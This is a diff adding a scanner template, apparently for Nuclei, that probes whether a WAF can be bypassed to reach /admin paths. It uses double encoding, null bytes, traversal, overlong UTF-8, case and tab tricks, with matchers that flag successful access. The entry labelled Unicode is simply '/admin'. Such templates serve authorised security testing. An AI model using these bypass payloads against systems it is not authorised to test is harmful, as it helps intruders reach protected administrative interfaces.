@@ -1,0 +1,74 @@
+id: waf-bypass-path-normalization
+
+info:
+  name: WAF Bypass via Path Normalization Techniques
+  author: chipo
+  severity: medium
+  description: |
+    Tests common path normalization and encoding bypass techniques against WAF-protected
+    endpoints. Many WAFs normalize paths differently than the application backend, creating
+    discrepancies that allow blocked paths to be reached. Tests include double URL encoding,
+    Unicode normalization, path traversal sequences that cancel themselves, case variation,
+    and URL fragment tricks. A 200 response where the baseline request was blocked (4xx)
+    indicates a successful bypass.
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+    - https://github.com/0xInfection/Awesome-WAF
+    - https://cwe.mitre.org/data/definitions/693.html
+  metadata:
+    false-positive: |
+      Medium. The baseline must be confirmed blocked before treating 200 responses as
+      bypasses. Applications with permissive routing that return 200 for all paths
+      will appear to bypass a WAF that never blocked them.
+    max-request: 12
+  tags: waf,bypass,path-normalization,encoding,owasp-a05
+
+http:
+  - method: GET
+    path:
+      # Double URL encoding of /admin
+      - "{{BaseURL}}/%2561dmin"
+      - "{{BaseURL}}/%2561dmin/"
+      # Null byte injection
+      - "{{BaseURL}}/admin%00"
+      - "{{BaseURL}}/admin%00.jpg"
+      # Path traversal self-canceling
+      - "{{BaseURL}}/./admin"
+      - "{{BaseURL}}/public/../admin"
+      - "{{BaseURL}}//admin"
+      # Unicode normalization bypass
+      - "{{BaseURL}}/admin"
+      - "{{BaseURL}}/%C0%AEadmin"
+      # Case variation
+      - "{{BaseURL}}/ADMIN"
+      - "{{BaseURL}}/Admin"
+      # Tab/newline confusion
+      - "{{BaseURL}}/admin%09"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        dsl:
+          - "len(body) > 50"
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - "dashboard"
+          - "admin"
+          - "panel"
+          - "management"
+          - "control"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: dsl
+        name: bypass_path
+        dsl:
+          - "request"
